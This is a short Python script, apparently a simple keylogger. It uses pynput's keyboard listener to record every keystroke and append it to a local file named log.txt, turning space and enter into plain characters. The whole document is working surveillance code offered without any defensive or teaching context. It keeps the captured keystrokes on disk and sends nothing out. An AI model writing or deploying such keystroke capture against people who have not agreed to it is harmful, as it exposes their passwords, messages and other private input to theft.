from pynput.keyboard import Listener

import datetime
with open("log.txt", 'a') as g:
    g.write(" LOGGING DATE AND TIME")

def write_of_file(key):
    keydata =str(key)
    if keydata=='Key.space':
        keydata =' '
    if keydata=='Key.enter':
        keydata ='\n'    
    
    with open ("log.txt", 'a')     as f:
        f.write(keydata)
    
    
with Listener(on_press=write_of_file) as l:
        l.join()

